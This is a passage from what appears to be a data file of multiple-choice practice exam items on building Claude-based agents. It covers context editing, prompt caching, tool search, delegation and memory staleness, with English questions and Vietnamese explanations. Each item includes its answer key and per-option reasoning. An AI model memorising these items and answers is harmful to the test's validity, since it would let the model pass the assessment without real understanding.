      "Bài “Building effective agents”: agent hợp với bài toán mở, khó đoán trước số bước, khó viết cứng đường đi. Đổi lại agent đắt hơn và lỗi có thể dồn lên nhau, nên cần test kỹ và có guardrail (rào chắn).",
      "Muốn biết thay đổi có đáng không thì phải đo: có eval cho phần mới, và so cost per success (chi phí mỗi lần thành công) với nhánh mặc định hiện tại.",
      "Nâng ngưỡng tin cậy của bộ phân loại nghĩa là ca nào không đủ chắc sẽ không được định tuyến, tức là rơi xuống nhánh mặc định."
    ],
    opts: [
      { k: "A", gist: "Keep adding routing rules until the fall-through rate is under one percent.",
        why: [
          "Sai: số luật chính là gốc của chi phí bảo trì, thêm luật là thêm gánh.",
          "Phần rơi xuống là đuôi dài, đúng chỗ luật phủ kém (ý 1). Đuổi xuống dưới 1% bằng luật là cuộc đua không thắng nổi."
        ] },
      { k: "B", gist: "Raise the classifier confidence threshold so fewer claims are routed on a guess.",
        why: [
          "Sai hướng: ngưỡng cao hơn thì nhiều hồ sơ hơn rơi xuống nhánh mặc định đang sai một phần ba (ý 4).",
          "Bớt đoán ở khâu định tuyến, nhưng dồn thêm ca vào chỗ hỏng nhất."
        ] },
      { k: "C", gist: "Keep the workflow for the well-understood claim classes, add an agentic handler with guardrails and an eval for the fall-through cases, and compare cost per success against the current default.",
        why: [
          "Đúng: giữ workflow cho các loại hồ sơ đã rõ, rẻ và đoán trước được (ý 1).",
          "Chỉ dùng agent cho phần rơi xuống, chỗ workflow đã chứng minh là hỏng, có guardrail và eval đi kèm (ý 2, ý 3). So cost per success với nhánh mặc định để biết có lời thật không."
        ] },
      { k: "D", gist: "Replace the whole workflow with one autonomous agent immediately, since agents cope with variety better.",
        why: [
          "Sai: chuyển cả 82% đang chạy ổn sang một kiểu đắt hơn, khó đoán hơn, mà không có bằng chứng (ý 2).",
          "Dễ bị cuốn vì “agent xử lý đa dạng tốt hơn” đúng với phần đuôi. Nhưng phần đầu không cần đa dạng, và “right away” (ngay lập tức) là bỏ qua bước đo."
        ] }
    ],
    refs: [
      { label: "Bài Building effective agents, mục “When (and when not) to use agents”: agent hợp bài toán mở, đổi lại tốn hơn và lỗi dễ dồn, cần test và guardrail", href: "https://www.anthropic.com/engineering/building-effective-agents" },
      { label: "Docs đánh giá, mục “Define your success criteria”: chốt tiêu chí cụ thể, đo được trước, rồi mới dựng bài đánh giá", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" }
    ]
  },
  {
    de: 1, n: 9, total: 100, sub: "1.3", subName: "Chọn kiến trúc khi chạy quy mô lớn",
    answer: "D",
    ask: "Five teams in one organization use four different agent frameworks, each with its own tracing, guardrails and eval scripts. As a result incidents take a long time to diagnose and fixes don't get shared. A platform lead has to propose a standard. Which proposal is best?",
    scene: [
      "Năm team, bốn framework agent khác nhau. Mỗi nơi tự có tracing (truy vết), guardrail và script eval riêng.",
      "Hậu quả: sự cố chẩn đoán chậm, bản sửa ở team này team khác không dùng lại được.",
      "Một platform lead phải đề xuất chuẩn chung. Chỗ khó: chuẩn phải gỡ được sự phân mảnh mà không ép bừa."
    ],
    asks: [
      "Đề xuất nào tốt nhất?",
      "Tức là: gom phần vận hành (trace, eval, guardrail) về một mối để chia sẻ được, nhưng vẫn chừa đường cho ngoại lệ có lý do."
    ],
    facts: [
      "Chi phí hiện tại nằm ở chỗ công cụ vận hành bị phân mảnh, không nằm ở việc framework nào hay hơn. Trace mỗi nơi một kiểu thì không ghép lại để điều tra được, eval mỗi nơi một kiểu thì không so được.",
      "Agent SDK là một ví dụ harness (bộ khung chạy agent) có sẵn hook, permission, session, subagent. Nó xuất trace, metric, event qua OpenTelemetry tới bất kỳ backend nào nhận OTLP, và đặt được tên service riêng cho từng agent để lọc.",
      "Chuẩn hóa giao diện chung cho trace, eval, guardrail là để bản sửa và bài eval của team này chạy được ở team kia.",
      "Chọn công cụ theo độ hợp và dữ liệu vận hành, không theo độ nổi tiếng. Bài “Building effective agents” cũng nhắc: dùng framework thì phải hiểu code bên dưới, giả định sai về nó là nguồn lỗi hay gặp."
    ],
    opts: [
      { k: "A", gist: "Let each team keep its framework, because agent needs differ too much for anything to be shared.",
        why: [
          "Sai: giữ nguyên là giữ đúng sự phân mảnh đang làm sự cố chậm (ý 1).",
          "Nhu cầu agent khác nhau là thật, nhưng trace, eval, guardrail thì team nào cũng cần và chia sẻ được (ý 3)."
        ] },
      { k: "B", gist: "Mandate the framework with the most community stars and require every team to migrate within a quarter.",
        why: [
          "Sai: số sao trên cộng đồng không phải tiêu chí chọn (ý 4).",
          "Ép chuyển trong một quý là bỏ qua bài eval và dữ liệu vận hành các team đang có, dễ gãy hàng loạt.",
          "Dễ bị cuốn vì nó cũng là “chuẩn hóa”. Nhưng chuẩn hóa theo độ nổi tiếng và bằng mệnh lệnh, không theo dữ liệu."
        ] },
      { k: "C", gist: "Have every team build its own harness from scratch so no outside framework can limit it.",
        why: [
          "Sai: mỗi team tự viết harness là nhân chi phí bảo trì lên, còn khó chia sẻ hơn hiện tại (ý 1).",
          "Đi ngược đúng điều đề cần: một mối chung."
        ] },
      { k: "D", gist: "Standardize on one agent harness and shared interfaces for tracing, evals and guardrails, add a small catalog of reusable patterns, and allow teams to deviate when data shows they need to.",
        why: [
          "Đúng: một harness và giao diện chung cho trace, eval, guardrail gỡ thẳng sự phân mảnh (ý 1, ý 3). Ví dụ mọi agent cùng xuất trace về một backend OpenTelemetry, lọc theo tên service (ý 2).",
          "Catalog mẫu dùng lại giúp team không phải tự chế từ đầu. Cho lệch chuẩn khi có dữ liệu chứng minh, nên chuẩn không thành gông (ý 4)."
        ] }
    ],
    refs: [
      { label: "Docs Observability with OpenTelemetry, mục “Tag telemetry from your agent”: nhiều agent cùng xuất về một backend, đặt tên service để lọc theo agent", href: "https://code.claude.com/docs/en/agent-sdk/observability#tag-telemetry-from-your-agent" },
      { label: "Docs Agent SDK overview, mục “Capabilities”: một harness có sẵn tool, hook, permission, session, subagent", href: "https://code.claude.com/docs/en/agent-sdk/overview#capabilities" },
      { label: "Bài Building effective agents, mục “When and how to use frameworks”: framework thêm lớp trừu tượng, dùng thì phải hiểu code bên dưới", href: "https://www.anthropic.com/engineering/building-effective-agents" }
    ]
  },
  {
    de: 1, n: 10, total: 100, sub: "1.4", subName: "Kiến trúc context và bộ nhớ",
    answer: "A",
    ask: "A coding agent has reached 160k tokens of context in a long session. Analysis shows roughly 70% of those tokens are file contents and command outputs from early steps the agent no longer needs, whereas the original task instructions and the recent reasoning still matter. Which context policy fits best?",
    scene: [
      "Agent viết code, phiên dài, context đã lên 160k token.",
      "Khoảng 70% là nội dung file và output lệnh từ các bước đầu, giờ không cần nữa. Còn chỉ dẫn gốc của task và phần suy luận gần đây thì vẫn quan trọng.",
      "Chỗ khó: cái thừa và cái quý là hai loại nội dung khác nhau. Chính sách nào cắt theo loại thì đúng, cắt theo vị trí hay nén đều tất cả thì hỏng."
    ],
    asks: [
      "Chính sách quản lý context nào hợp nhất?",
      "Tức là: bỏ đúng phần tool output cũ, giữ chỉ dẫn và các lượt gần, và không làm mất những phát hiện còn cần về sau."
    ],
    facts: [
      "Tool result clearing (xóa kết quả tool) trong context editing: khi context vượt ngưỡng đặt trước, API xóa các kết quả tool cũ nhất, thay bằng dòng báo đã xóa, và giữ lại vài lượt dùng tool gần nhất (tham số <code>keep</code>). Mặc định chỉ xóa kết quả tool, phần còn lại của hội thoại giữ nguyên.",
      "Context editing ghép được với memory tool: gần tới ngưỡng xóa, Claude được báo trước để lưu điều quan trọng vào file memory. Memory tool lưu file trong thư mục <code>/memories</code>, còn qua các phiên, cần thì đọc lại.",
      "Context càng dài thì model nhớ lại càng kém (context rot). Bài “Effective context engineering” gọi xóa kết quả tool là một trong những kiểu nén an toàn, nhẹ tay nhất.",
      "Chỉ dẫn gốc của task nằm ở đầu hội thoại, tức là thuộc nhóm tin nhắn cũ nhất."
    ],
    opts: [
      { k: "A", gist: "Use context editing to clear stale tool results while keeping the instructions and recent turns, and store durable findings with the memory tool.",
        why: [
          "Đúng: phần phình là tool output cũ, xóa đúng loại đó thì chỉ dẫn và các lượt gần vẫn nguyên (ý 1, ý 3).",
          "Điều đáng giữ lâu được lưu vào memory trước khi bị xóa, cần thì đọc lại (ý 2)."
        ] },
      { k: "B", gist: "After every turn, summarize the whole conversation into a single paragraph, task instructions included.",
        why: [
          "Sai: tóm cả hội thoại sau mỗi lượt là nén có mất mát, lặp đi lặp lại thì chi tiết rơi dần.",
          "Tóm luôn chỉ dẫn gốc là dễ làm méo hoặc mất đúng phần đề nói vẫn quan trọng.",
          "Dễ bị cuốn vì “tóm tắt” nghe giống cách quản lý context quen thuộc. Nhưng nén cả cái đang quý chỉ để bỏ cái thừa là tốn mà hại."
        ] },
      { k: "C", gist: "Drop the oldest messages until the context fits, no matter what they contain.",
        why: [
          "Sai: cắt theo vị trí thì tin cũ nhất đi trước, mà chỉ dẫn gốc nằm ngay đầu (ý 4).",
          "Có thể xóa mất task trong khi tool output cũ ở giữa vẫn còn đó."
        ] },
      { k: "D", gist: "Switch to a larger context window and leave the history as it is.",
        why: [
          "Sai: cửa sổ to hơn không bỏ được 70% thứ thừa. Mỗi request vẫn gửi lại chừng ấy token và vẫn tính tiền, model vẫn nhớ kém hơn khi context đầy thứ không liên quan (ý 3).",
          "Chỉ đẩy vấn đề lùi lại một đoạn."
        ] }
    ],
    refs: [
      { label: "Docs Context editing, mục “Tool result clearing”: xóa kết quả tool cũ nhất khi vượt ngưỡng, giữ lại vài lượt gần nhất", href: "https://platform.claude.com/docs/en/build-with-claude/context-editing#tool-result-clearing" },
      { label: "Docs Context editing, mục “Using with the memory tool”: Claude được báo trước để lưu điều quan trọng vào memory trước khi bị xóa", href: "https://platform.claude.com/docs/en/build-with-claude/context-editing#using-with-the-memory-tool" },
      { label: "Bài Effective context engineering for AI agents, mục “Compaction”: xóa kết quả tool là kiểu nén nhẹ tay, an toàn nhất", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 11, total: 100, sub: "1.4", subName: "Kiến trúc context và bộ nhớ",
    answer: "B",
    ask: "A team puts the current timestamp and the user's plan tier inside the system prompt. Partway through a conversation, whenever a new policy kicks in, the application rewrites the system prompt. Cache read tokens are close to zero and the cost per conversation is high. Which change fixes the caching behavior best?",
    scene: [
      "System prompt chứa thời điểm hiện tại (timestamp) và gói dịch vụ (plan tier) của user.",
      "Giữa hội thoại, mỗi lần có chính sách mới, app viết lại system prompt.",
      "Triệu chứng: token đọc từ cache (cache read) gần bằng 0, chi phí mỗi hội thoại cao. Tức là lần nào cũng ghi cache mới mà gần như không bao giờ đọc lại được.",
      "Chỗ khó: cả bốn phương án đều đụng tới cache (thêm breakpoint, dời timestamp, tăng thời hạn), nghe như đang sửa. Phải nhìn ra gốc là phần đầu prompt bị đổi liên tục."
    ],
    asks: [
      "Thay đổi nào sửa hành vi cache tốt nhất?",
      "Tức là: làm sao cho phần đầu prompt giống y hệt giữa các request, để cache khớp được.",
      "Soi từng phương án: sau thay đổi đó, system prompt còn bị sửa nữa không?"
    ],
    facts: [
      "Prompt caching khớp theo tiền tố (prefix), thứ tự <code>tools</code> → <code>system</code> → <code>messages</code>. Cache hit cần đoạn đó giống y hệt 100%. Đổi ở tầng nào thì tầng đó và mọi tầng sau mất cache.",
      "Breakpoint (<code>cache_control</code>) chỉ đánh dấu chỗ ghi cache. Docs dặn đặt nó ở block cuối cùng còn giống nhau giữa các request. Phần đổi theo request (timestamp, ngữ cảnh riêng từng lượt) để sau phần tĩnh.",
      "Cache mặc định sống 5 phút, có lựa chọn 1 giờ phải trả thêm. Thời hạn chỉ giữ lâu cái đã ghi, tiền tố khác thì vẫn miss.",
      "Trên một số model mới, docs cho thêm một message <code>{\"role\": \"system\"}</code> vào <code>messages</code> giữa hội thoại thay vì sửa trường <code>system</code> trên đầu, để phần đầu đã cache giữ nguyên."
    ],
    opts: [
      { k: "A", gist: "Place more cache breakpoints right at the beginning of the prompt so a larger share of it is covered.",
        why: [
          "Sai ở giả định: breakpoint chỉ đánh dấu chỗ ghi cache, không làm một tiền tố đang đổi khớp lại được (ý 1, ý 2).",
          "Timestamp và chính sách vẫn nằm trong system prompt, nên mọi thứ từ system trở đi vẫn miss. Đặt breakpoint ở đầu còn phủ ít hơn, không phải nhiều hơn."
        ] },
      { k: "B", gist: "Keep the system prompt and tool list fixed at the front, and send changing values and new policies as later messages in the conversation.",
        why: [
          "Đúng gốc bệnh: <code>tools</code> và <code>system</code> giữ nguyên thì tiền tố giống y hệt giữa các request, cache khớp (ý 1).",
          "Phần hay đổi (timestamp, chính sách mới) đi vào message phía sau. Message mới chỉ nối thêm, phần trước nó vẫn đọc được từ cache (ý 2).",
          "Docs có sẵn cách làm đúng tinh thần này: thêm message system giữa hội thoại thay vì sửa system prompt (ý 4)."
        ] },
      { k: "C", gist: "Move the timestamp to the end of the system prompt but keep rewriting the policy text inside it.",
        why: [
          "Sai vì system prompt vẫn bị sửa mỗi khi có chính sách mới, nên system và mọi message sau nó mất cache (ý 1).",
          "Timestamp ở cuối system thì vẫn nằm trong system. Nó đổi mỗi request thì tầng system vẫn không khớp. Dời chỗ trong cùng một tầng không cứu được tầng đó.",
          "Dễ bị cuốn vì “để phần hay đổi ở cuối” đúng là điều docs khuyên. Nhưng “cuối” phải là sau phần tĩnh, trong <code>messages</code>, không phải cuối system prompt (ý 2)."
        ] },
      { k: "D", gist: "Choose the longest cache lifetime available so the rewritten prefix stays in the cache for longer.",
        why: [
          "Sai ở giả định: thời hạn chỉ giữ lâu cái đã ghi. Mỗi lần viết lại là một tiền tố khác, không có gì để đọc lại (ý 3).",
          "Còn tốn thêm: cache 1 giờ phải trả thêm, mà vẫn miss như cũ."
        ] }
    ],
    refs: [
      { label: "Docs Prompt caching, mục “What invalidates the cache”: thứ tự tools → system → messages, đổi tầng nào mất cache tầng đó trở đi, và cách thêm message system giữa hội thoại", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#what-invalidates-the-cache" },
      { label: "Docs Prompt caching, mục “Structuring your prompt”: phần tĩnh để đầu, breakpoint đặt ở block cuối còn giống nhau, phần đổi theo request (timestamp) để sau", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#structuring-your-prompt" }
    ]
  },
  {
    de: 1, n: 12, total: 100, sub: "1.4", subName: "Kiến trúc context và bộ nhớ",
    answer: "A",
    ask: "An agent is wired to several MCP servers that together expose around 400 tools. Their definitions cost about 60k tokens on every request, and the agent picks the right tool less often as the catalog has grown. Which technique best fixes both the context size and the selection accuracy?",
    scene: [
      "Agent nối nhiều MCP server, tổng cộng khoảng 400 tool.",
      "Định nghĩa tool chiếm khoảng 60k token mỗi request. Danh mục càng to, agent chọn tool càng hay sai.",
      "Chỗ khó: đề đòi sửa cùng lúc hai thứ, kích thước context và độ chính xác. Có phương án chỉ sửa được giá, có phương án sửa bằng cách phá việc."
    ],
    asks: [
      "Kỹ thuật nào giải quyết tốt nhất cả kích thước context lẫn độ chính xác chọn tool?",
      "Tức là: mỗi việc model chỉ nên thấy vài tool liên quan, nhưng vẫn dùng được cả 400 khi cần."
    ],
    facts: [
      "Docs “Tool search tool”: nạp hết định nghĩa tool từ đầu gây hai vấn đề. Một là phình context (ví dụ của docs: vài MCP server đã tốn khoảng 55k token). Hai là khả năng chọn đúng tool giảm khi vượt 30–50 tool.",
      "Tool search: mày vẫn gửi đủ định nghĩa, nhưng đánh dấu <code>defer_loading: true</code> (hoãn nạp). Ban đầu context chỉ có tool search tool và vài tool không hoãn. Khi cần, Claude tìm, mỗi lần mặc định trả tối đa 5 tool, API mở chúng thành định nghĩa đầy đủ. Tool từ MCP connector thì đặt <code>defer_loading</code> trên cấu hình <code>mcp_toolset</code>.",
      "Prompt caching giảm giá các token lặp lại, nhưng token đã cache vẫn nằm trong context. Model vẫn phải chọn giữa đủ 400 tool.",
      "Docs khuyên viết tên và mô tả tool rõ, có từ khóa khớp cách user mô tả việc. Mô tả càng cụt, tìm và chọn càng khó."
    ],
    opts: [
      { k: "A", gist: "Turn on tool search with deferred loading so only a small, relevant set of tool definitions enters the context when needed.",
        why: [
          "Đúng cả hai vế: context chỉ chứa vài tool tìm được, không phải 60k token định nghĩa (ý 1, ý 2).",
          "Model chọn trong một nhóm nhỏ đúng việc nên độ chính xác giữ được. Cả 400 tool vẫn còn đó, chỉ chưa nạp. Tool đến từ MCP server cũng hoãn nạp được (ý 2)."
        ] },
      { k: "B", gist: "Keep every one of the 400 tools loaded, but turn on prompt caching for their definitions.",
        why: [
          "Sửa một nửa: giá token lặp lại giảm, nhưng 60k token vẫn chiếm context (ý 3).",
          "Model vẫn đứng trước 400 lựa chọn, nên chọn sai vẫn như cũ (ý 1).",
          "Dễ bị cuốn vì caching sửa được chuyện tiền thật. Nhưng đề hỏi kích thước context và độ chính xác, caching không đụng tới hai thứ đó."
        ] },
      { k: "C", gist: "Delete half of the tools at random to halve the catalog.",
        why: [
          "Sai vì xóa ngẫu nhiên là mất luôn năng lực user cần, không có lý do gì để bỏ tool này giữ tool kia.",
          "Còn 200 tool vẫn vượt xa ngưỡng 30–50 tool mà docs nói độ chính xác bắt đầu giảm (ý 1)."
        ] },
      { k: "D", gist: "Cut every tool description down to one word to lower the token count.",
        why: [
          "Sai hướng: mô tả là thứ model dựa vào để chọn tool. Cắt còn một chữ thì chọn còn khó hơn (ý 4).",
          "Token có giảm, nhưng độ chính xác, một nửa yêu cầu của đề, lại tệ đi."
        ] }
    ],
    refs: [
      { label: "Docs Tool search tool, phần mở đầu: hai vấn đề khi nạp hết tool (phình context, chọn sai khi vượt 30–50 tool)", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool" },
      { label: "Docs Tool search tool, mục “Deferred tool loading”: <code>defer_loading</code> quyết định cái gì vào context, không phải cái gì gửi đi", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool#deferred-tool-loading" },
      { label: "Docs Tool search tool, mục “MCP integration”: hoãn nạp cho cả MCP server qua <code>mcp_toolset</code>", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool#mcp-integration" }
    ]
  },
  {
    de: 1, n: 13, total: 100, sub: "1.4", subName: "Kiến trúc context và bộ nhớ",
    answer: "D",
    ask: "An analytics agent has to compute statistics over 5,000 rows. Right now it calls a data tool over and over, and each response of several thousand rows is added to the conversation, so the context fills up fast. The agent needs only aggregate numbers. What is the best approach?",
    scene: [
      "Agent phân tích cần tính thống kê trên 5.000 dòng.",
      "Mỗi lần gọi tool dữ liệu trả về vài nghìn dòng, tất cả đổ vào hội thoại, context đầy rất nhanh.",
      "Chỗ then chốt: agent chỉ cần số tổng hợp (aggregate), không cần đọc từng dòng."
    ],
    asks: [
      "Cách nào tốt nhất?",
      "Tức là: dữ liệu thô đi đâu để khỏi qua context của model, mà vẫn ra được con số.",
      "Soi từng phương án: các dòng dữ liệu còn đi vào context không?"
    ],
    facts: [
      "Programmatic tool calling (gọi tool bằng code): Claude viết code Python gọi tool như một hàm, chạy trong container code execution. Kết quả trung gian không nạp vào context của Claude, chỉ output cuối của code đi vào.",
      "Docs nêu đúng ca dùng: xử lý dữ liệu lớn, lọc hoặc tổng hợp kết quả tool trước khi tới context. Một tool gọi được từ code khi định nghĩa của nó có <code>allowed_callers</code> trỏ tới code execution.",
      "Compaction (nén) tóm tắt lịch sử hội thoại, còn context editing dọn kết quả tool cũ khi context vượt ngưỡng. Cả hai chạy sau khi dữ liệu đã vào context.",
      "Docs context editing: context là tài nguyên hữu hạn, nội dung không liên quan làm model kém tập trung. Cửa sổ to hơn không đổi điều đó, và mày vẫn trả tiền cho mọi token đưa vào."
    ],
    opts: [
      { k: "A", gist: "Switch to a model with a bigger context window and leave the loop as it is.",
        why: [
          "Sai vì chỉ lùi giới hạn: dữ liệu lớn thêm là lại đầy (ý 4).",
          "Vẫn trả tiền cho hàng nghìn dòng model không cần đọc, trong khi nó chỉ cần con số tổng."
        ] },
      { k: "B", gist: "Compact the conversation after every tool call so earlier rows get summarized.",
        why: [
          "Sai thời điểm: compaction chạy khi các dòng đã vào context rồi (ý 3).",
          "Tóm tắt dữ liệu số dễ mất con số chính xác. Tính thống kê trên bản tóm tắt thì kết quả sai.",
          "Dễ bị cuốn vì compaction đúng là công cụ chống đầy context. Nhưng ở đây dữ liệu vốn không cần vào context, chặn từ đầu tốt hơn dọn sau."
        ] },
      { k: "C", gist: "Have the data tool leave out optional columns, but still send every row to the model.",
        why: [
          "Chỉ làm mỗi dòng ngắn đi, vẫn đủ 5.000 dòng đi vào context.",
          "Agent chỉ cần số tổng, nên đọc từng dòng vẫn là thừa."
        ] },
      { k: "D", gist: "Use programmatic tool calling: the model writes code that calls the tool and aggregates the rows inside the execution environment, and only the summary comes back to context.",
        why: [
          "Đúng: các dòng dữ liệu ở lại trong container, code tính tổng hợp, chỉ kết quả vào context (ý 1).",
          "Đây là đúng ca dùng docs nêu: lọc, tổng hợp kết quả tool lớn trước khi tới context (ý 2). Con số tính bằng code, không qua tóm tắt, nên chính xác."
        ] }
    ],
    refs: [
      { label: "Docs Programmatic tool calling, mục “How programmatic tool calling works”: kết quả trung gian không vào context, ca dùng xử lý dữ liệu lớn", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/programmatic-tool-calling#how-programmatic-tool-calling-works" },
      { label: "Docs Context editing, mục “Overview” và “Tool result clearing”: dọn kết quả tool cũ chỉ là dọn sau khi đã vào context", href: "https://platform.claude.com/docs/en/build-with-claude/context-editing" }
    ]
  },
  {
    de: 1, n: 14, total: 100, sub: "1.1", subName: "Điều phối multi-agent",
    answer: "C",
    ask: "A supervisor tells a worker agent to “investigate the checkout outage”. The worker runs for several minutes, pokes at unrelated services, and hands back a long narrative the supervisor can't use. Which change to the delegation improves the results most directly?",
    scene: [
      "Supervisor giao cho worker đúng một câu: “investigate the checkout outage” (điều tra sự cố thanh toán).",
      "Worker chạy vài phút, đụng cả dịch vụ không liên quan, trả về một bài kể dài mà supervisor không dùng được.",
      "Chỗ khó: ba triệu chứng (lan man, lâu, đầu ra vô dụng) chung một gốc là lời giao việc quá mơ hồ."
    ],
    asks: [
      "Thay đổi nào trong cách giao việc cải thiện kết quả trực tiếp nhất?",
      "Tức là: lời giao việc phải nói rõ làm gì, trong phạm vi nào, trả về dạng gì, khi nào dừng."
    ],
    facts: [
      "Bài engineering “How we built our multi-agent research system”: mỗi subagent cần mục tiêu (objective), định dạng đầu ra (output format), hướng dẫn dùng tool và nguồn nào, và ranh giới việc rõ ràng.",
      "Cũng bài đó: thiếu mô tả chi tiết thì agent làm trùng, bỏ sót, hoặc không tìm được thứ cần. Lệnh ngắn kiểu “research the semiconductor shortage” khiến subagent hiểu sai việc hoặc tìm trùng nhau.",
      "Bài còn đặt quy tắc co giãn công sức ngay trong prompt: tra cứu đơn giản chỉ cần 1 agent với 3–10 lần gọi tool. Tức là phải nói trước làm tới đâu thì dừng (stopping condition, điều kiện dừng).",
      "Output schema (khuôn đầu ra): quy định các trường worker phải trả, để supervisor xử lý bằng code được, không phải đọc một bài văn."
    ],
    opts: [
      { k: "A", gist: "Tell the worker to think step by step before answering, changing nothing else about the request.",
        why: [
          "Sai chỗ: cách suy luận không định nghĩa phạm vi hay định dạng đầu ra (ý 1).",
          "Worker nghĩ kỹ hơn nhưng vẫn không biết đụng dịch vụ nào, trả gì, khi nào dừng. Có khi còn dài hơn."
        ] },
      { k: "B", gist: "Let the worker spin up its own sub-workers whenever the task seems unclear.",
        why: [
          "Sai hướng: việc mơ hồ đem chia tiếp thì mơ hồ nhân lên, mỗi sub-worker lại tự đoán (ý 2).",
          "Tốn thêm thời gian và chi phí, mà gốc là lời giao việc vẫn chưa sửa."
        ] },
      { k: "C", gist: "Give each delegation an explicit goal, constraints and scope, a mandatory output schema, and a condition for when to stop.",
        why: [
          "Đúng đủ các thứ bài engineering liệt kê: mục tiêu, ranh giới việc, định dạng đầu ra (ý 1).",
          "Phạm vi chặn chuyện lan sang dịch vụ không liên quan. Điều kiện dừng chặn chạy lâu (ý 3). Output schema làm kết quả dùng được ngay (ý 4)."
        ] },
      { k: "D", gist: "Hand the worker the supervisor's full conversation history so it has every piece of context.",
        why: [
          "Sai vì thêm dữ kiện không thay được lời giao việc rõ: worker vẫn không biết mục tiêu, phạm vi, dạng trả về (ý 1).",
          "Còn đổ thêm nhiễu vào context của worker, mất cái lợi của việc cho mỗi agent một context riêng gọn.",
          "Dễ bị cuốn vì “thiếu context” nghe như đúng bệnh. Nhưng thứ worker thiếu là mô tả việc, không phải lịch sử."
        ] }
    ],
    refs: [
      { label: "Bài engineering How we built our multi-agent research system, mục “Prompt engineering and evaluations for research agents”, ý “Teach the orchestrator how to delegate”: subagent cần mục tiêu, định dạng đầu ra, hướng dẫn tool, ranh giới việc", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 15, total: 100, sub: "1.2", subName: "Chạy bền và quản lý trạng thái",
    answer: "D",
    ask: "An agent relies on the memory tool to keep customer facts over several weeks. A customer has moved, yet the agent keeps shipping to the old address it saved before. Which design change best stops it from acting on stale memory?",
    scene: [
      "Agent dùng memory tool lưu thông tin khách qua nhiều tuần.",
      "Khách đã chuyển nhà, agent vẫn gửi hàng tới địa chỉ cũ nó lưu trước đó.",
      "Chỗ khó: memory không sai lúc ghi. Nó đúng ở thời điểm đó, rồi cũ đi mà agent không biết."
    ],
    asks: [
      "Thay đổi thiết kế nào chặn tốt nhất việc hành động dựa trên ký ức cũ (stale memory)?",
      "Tức là: trước hành động có hậu quả, agent phải biết dữ kiện còn đúng không, và kiểm ở đâu."
    ],
    facts: [
      "Memory tool chạy phía client: Claude yêu cầu thao tác file, ứng dụng của mày chạy và lưu trên hạ tầng của mày. File nhớ còn qua các phiên, phiên sau đọc lại để làm tiếp.",
      "Memory là ghi chép điều agent từng thấy, không tự cập nhật khi thế giới đổi. Docs memory tool khuyên định kỳ xóa file nhớ lâu không truy cập (mục “Memory expiration”), và có thể dặn Claude giữ memory cập nhật, xóa file không còn liên quan.",
      "System of record (hệ thống gốc): nơi được coi là đúng cho một dữ kiện, vd hệ thống khách hàng giữ địa chỉ hiện tại. Dữ kiện hay đổi phải kiểm ở đó trước hành động có hậu quả như gửi hàng.",
      "Provenance (nguồn gốc) và timestamp (thời điểm ghi) đi kèm mỗi mục nhớ cho agent biết dữ kiện lấy từ đâu, cũ bao lâu, để biết lúc nào phải kiểm lại."
    ],
    opts: [
      { k: "A", gist: "Give memory more capacity so the new address can sit alongside the old one.",
        why: [
          "Sai vì vấn đề không phải thiếu chỗ. Lưu cả hai địa chỉ mà không biết cái nào hiện hành thì càng mơ hồ.",
          "Agent vẫn có thể chọn nhầm địa chỉ cũ, và vẫn không kiểm với hệ thống gốc (ý 3)."
        ] },
      { k: "B", gist: "Drop the memory tool and depend on the model remembering the earlier conversation.",
        why: [
          "Sai vì model không tự nhớ gì qua phiên. Bỏ memory là phiên mới mất sạch (ý 1).",
          "Mà điều nhớ được trong hội thoại cũ cũng chỉ là điều từng thấy, cũ y như memory."
        ] },
      { k: "C", gist: "Put more detail into each memory entry so the agent has richer information.",
        why: [
          "Sai vì chi tiết hơn về một dữ kiện đã cũ không làm nó mới lại (ý 2).",
          "Dễ bị cuốn vì “thông tin phong phú hơn” nghe như giúp agent quyết đúng. Nhưng nó thiếu đúng cái quan trọng: dữ kiện ghi lúc nào, và giờ còn đúng không (ý 4)."
        ] },
      { k: "D", gist: "Save memories with their provenance and timestamps, and check against the system of record before taking any consequential action.",
        why: [
          "Đúng: coi memory là bản ghi quá khứ, có nguồn và tuổi để agent đánh giá (ý 2, ý 4).",
          "Trước việc có hậu quả như gửi hàng, kiểm địa chỉ ở hệ thống gốc (ý 3). Khách đổi địa chỉ thì agent thấy ngay, không gửi nhầm."
        ] }
    ],
    refs: [
      { label: "Docs Memory tool, mục “How it works”: memory chạy phía client, lưu ở hạ tầng của mày, còn qua các phiên", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool#how-it-works" },
      { label: "Docs Memory tool, mục “Memory expiration” (trong “Security considerations”): định kỳ dọn file nhớ lâu không dùng", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool#memory-expiration" }
    ]
  },
  {
    de: 1, n: 16, total: 100, sub: "1.3", subName: "Chọn kiến trúc khi chạy quy mô lớn",
    answer: "CD",
    ask: "A team runs an agent that processes invoices and needs to decide whether to harden it into a workflow. Which two production findings give the strongest support for moving the main path to a workflow? (Choose two.)",
    scene: [
      "Team đang chạy một agent xử lý hóa đơn, cân nhắc có nên “cứng hóa” đường chính thành workflow không.",
      "Đề đưa năm phát hiện. Có cái là dữ liệu chạy thật (trace, chi phí), có cái chỉ là ý thích hay một sự kiện bên ngoài.",
      "Chỗ khó: E (ba mươi tool) nghe như dấu hiệu hệ phức tạp, nhưng nó không nói gì về chuyện đường đi có biến đổi hay không."
    ],
    asks: [
      "Hai phát hiện nào ủng hộ mạnh nhất việc chuyển đường chính sang workflow?",
      "Tức là: bằng chứng cho thấy sự linh hoạt của agent không đem lại gì trên đường này.",
      "Soi từng phương án: nó có phải dữ liệu chạy thật không, và có nói về độ biến đổi hay giá trị của agent không?"
    ],
    facts: [
      "Bài “Building effective agents”: workflow là LLM và tool chạy theo đường code định sẵn. Agent là LLM tự quyết quy trình và cách dùng tool.",
      "Cũng bài đó: hệ agentic thường đổi độ trễ và chi phí lấy hiệu quả tốt hơn. Workflow cho tính dự đoán được và nhất quán với việc đã định rõ.",
